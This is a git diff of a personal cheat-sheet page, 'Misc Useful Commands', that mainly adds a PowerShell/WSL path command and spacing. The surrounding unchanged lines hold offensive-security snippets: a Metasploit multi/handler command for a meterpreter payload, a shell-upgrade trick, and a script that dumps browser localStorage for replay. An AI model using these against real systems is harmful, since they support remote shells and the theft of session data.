@@ -1,6 +1,6 @@
 ---
 creation_epoch: 1761833175
-lastmod_epoch: 1761833175
+lastmod_epoch: 1771962772
 categories: ['Tech Tricks']
 title: Misc Useful Commands
 ---
@@ -10,13 +10,26 @@ title: Misc Useful Commands
 MYFILE.7z STUFFTOCOMPRESS
 </pre>
 
+<br />
 <hr />
+<br />
+
+<pre>
+powershell.exe -c 'Write-Host -NoNewLine $env:userprofile' | tr '\\' '/' | xargs wslpath
+</pre>
+
+<br />
+<hr />
+<br />
 
 <pre>
 echo -ne "\033]0;INSERTTERMTABTITLEHERE\007"
 </pre>
 
+<br />
 <hr />
+<br />
+
 
 <pre>
 # STAGELESS
@@ -47,7 +60,10 @@ msfconsole --execute-command 'use exploit/multi/handler; set PAYLOAD linux/x64/m
 script /dev/null -c bash
 </pre>
 
+<br />
 <hr />
+<br />
+
 
 <pre>
 copy('var data = '+JSON.stringify(localStorage)+';
@@ -56,13 +72,19 @@ copy('var data = '+JSON.stringify(localStorage)+';
 Object.keys(data).forEach(function (k){localStorage.setItem(k, data[k]);});');
 </pre>
 
+<br />
 <hr />
+<br />
+
 
 <pre>
 https_proxy= NO_PROXY= HTTPS_PROXY= HTTP_PROXY= http_proxy= ALL_PROXY= all_proxy= AWS_CA_BUNDLE=     
 </pre>
 
+<br />
 <hr />
+<br />
+
 
 <pre>
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
